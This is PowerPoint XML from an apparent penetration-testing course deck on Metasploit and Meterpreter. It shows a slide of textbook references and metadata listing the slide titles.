      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22482367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g3264a707208_0_9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="354577" y="1023576"/>
            <a:ext cx="57402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2"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>PPT Content Resources Reference Sample: </a:t>
            </a:r>
            <a:endParaRPr sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="86" name="Google Shape;86;g3264a707208_0_9"/>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87" name="Google Shape;87;g3264a707208_0_9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="383250" y="1789925"/>
            <a:ext cx="8395500" cy="4527748"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="152400" lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Book Reference</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="381000" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t>Metasploit: The Penetration Tester's Guide David Kennedy, Jim O'Gorman, Devon Kearns, Mati Aharoni (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0" err="1"/>
              <a:t>TextBook</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="381000" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t>Hacking: The Art of Exploitation Jon Erickson </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="381000" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t> Network Security Essentials William Stallings </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="381000" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t>Metasploit Penetration Testing Cookbook </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0" err="1"/>
              <a:t>Packt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t> Publishing </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="381000" lvl="0" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t>Metasploit Revealed - Secrets of the Expert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0" err="1"/>
              <a:t>Pentester</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t> - Build your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0" err="1"/>
              <a:t>Defense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t> against Complex Attacks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0" err="1"/>
              <a:t>Packt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1200" dirty="0"/>
              <a:t> Publishing.</a:t>
            </a:r>
            <a:endParaRPr sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>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477</TotalTime>
  <Words>7808</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>504</Paragraphs>
  <Slides>69</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69</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="74" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Noto Sans Symbols</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>  Contd.. </vt:lpstr>
      <vt:lpstr>Vulnerability Assessment Approach</vt:lpstr>
      <vt:lpstr> Penetration Testing </vt:lpstr>
      <vt:lpstr>Penetration Testing: Types</vt:lpstr>
      <vt:lpstr>Contd..</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Contd..</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Roles and Responsibilities of Penetration Testers</vt:lpstr>
      <vt:lpstr>Penetration testing: Manual vs. Automated</vt:lpstr>
      <vt:lpstr>Importance of Penetration testing</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr> Cybersecurity Myths </vt:lpstr>
      <vt:lpstr>Contd..</vt:lpstr>
      <vt:lpstr>VA/PT</vt:lpstr>
      <vt:lpstr> Contd.. </vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr> Need of Penetration Testing Framework? </vt:lpstr>
      <vt:lpstr>Contd...</vt:lpstr>
      <vt:lpstr>Need of PT Framework: Vulnerability Life Cycle</vt:lpstr>
      <vt:lpstr>Need of PT Framework: Penetration Testing Cycle</vt:lpstr>
      <vt:lpstr>Why Metasploit?</vt:lpstr>
      <vt:lpstr>Security Audit Framework</vt:lpstr>
      <vt:lpstr> Steps to Install Metasploit on Windows</vt:lpstr>
      <vt:lpstr> Steps to Install Metasploit on Linux</vt:lpstr>
      <vt:lpstr>Setting up multiple communication channels with the target</vt:lpstr>
      <vt:lpstr>Contd..</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Meterpreter anti-forensics</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>the get-desktop and keystroke sniffing</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Meterpreter resource scripts</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Timeout Control and Sleep Control in Meterpreter</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Meterpreter transports</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Interacting with the Windows Registry</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>The Meterpreter API </vt:lpstr>
      <vt:lpstr>Post-Exploitation Mixins</vt:lpstr>
      <vt:lpstr>Remote Desktop Protocol (RDP)</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>VNC Injection</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Remote Desktop (RDP</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Gowtham Arunagiri</cp:lastModifiedBy>
  <cp:revision>14</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-12-13T07:18:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-13T05:07:21Z</dcterms:modified>
</cp:coreProperties>
</file>